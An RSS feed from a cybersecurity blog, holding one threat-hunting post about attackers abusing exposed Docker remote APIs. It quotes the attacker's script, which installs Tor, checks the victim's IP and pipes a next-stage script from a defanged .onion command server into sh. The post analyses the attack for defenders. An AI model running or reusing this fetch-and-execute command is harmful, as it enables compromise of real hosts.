<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Threat-Hunting on Lucas Brown — Cybersecurity Blog</title>
    <link>http://localhost:1313/tags/threat-hunting/</link>
    <description>Recent content in Threat-Hunting on Lucas Brown — Cybersecurity Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>© 2025 Lucas Brown</copyright>
    <lastBuildDate>Thu, 11 Sep 2025 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/tags/threat-hunting/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Docker API Breach with a New Malware Variant</title>
      <link>http://localhost:1313/posts/docker-api-botnet/</link>
      <pubDate>Thu, 11 Sep 2025 00:00:00 +0000</pubDate>
      
      <guid>http://localhost:1313/posts/docker-api-botnet/</guid>
      <description>&lt;p&gt;The attackers start by sending an initial HTTP request to a Docker remote API server to create a new container. In this case, the Akamai Threat Hunting team used the Beelzebub honeypot to discover this threat. The attacker then creates a new container image running Alpine Linux that mounts the host&amp;rsquo;s filesystem and executes a base64-encoded script.&lt;/p&gt;

&lt;h3 class=&#34;relative group&#34;&gt;Script executed 
    &lt;div id=&#34;script-executed&#34; class=&#34;anchor&#34;&gt;&lt;/div&gt;
    
    &lt;span
        class=&#34;absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none&#34;&gt;
        &lt;a class=&#34;group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline&#34; href=&#34;#script-executed&#34; aria-label=&#34;Anchor&#34;&gt;#&lt;/a&gt;
    &lt;/span&gt;        
    
&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;
&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
&lt;/span&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apk update &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apk add curl tor &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; tor &amp;amp; &lt;span style=&#34;color:#f1fa8c&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;while&lt;/span&gt; ! curl -fs --proxy socks5h://localhost:9050 https://checkip.amazonaws.com; &lt;span style=&#34;color:#ff79c6&#34;&gt;do&lt;/span&gt; sleep 10; &lt;span style=&#34;color:#ff79c6&#34;&gt;done&lt;/span&gt;; &lt;span style=&#34;color:#f1fa8c&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&lt;/span&gt;curl -fs --proxy socks5h://localhost:9050 http://wtxqf54djhp5pskv2lfyduub5ievxbyvlzjgjopk6hxge5umombr63ad&lt;span style=&#34;color:#ff79c6&#34;&gt;[&lt;/span&gt;.&lt;span style=&#34;color:#ff79c6&#34;&gt;]&lt;/span&gt;onion/static/docker-init.sh | sh
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;The script installs &amp;ldquo;curl&amp;rdquo; and &amp;ldquo;tor&amp;rdquo;, then starts a Tor daemon &amp;ldquo;tor&amp;amp;&amp;rdquo;, and attempts to obtain the public IP address of the victim by looping through every 10 seconds until the IP is requested through the Tor proxy (curl -fs &amp;ndash;proxy socks5h://localhost:9050 &lt;a
  href=&#34;https://checkip.amazonaws.com&#34;
    target=&#34;_blank&#34;
  &gt;https://checkip.amazonaws.com&lt;/a&gt;; do sleep 10; done;). The attacker is using a SOCKS5 proxy locally to send data to the Tor daemon, which then gets sent to the Tor network and then to the &amp;ldquo;.onion&amp;rdquo; C2. The attacker uses this C2 to pull their next-stage script (docker-init.sh) and execute it (curl -fs &amp;ndash;proxy socks5h://localhost:9050 http://wtxqf54djhp5pskv2lfyduub5ievxbyvlzjgjopk6hxge5umombr63ad[.]onion/static/docker-init.sh).&lt;/p&gt;</description>
      
    </item>
    
  </channel>
</rss>
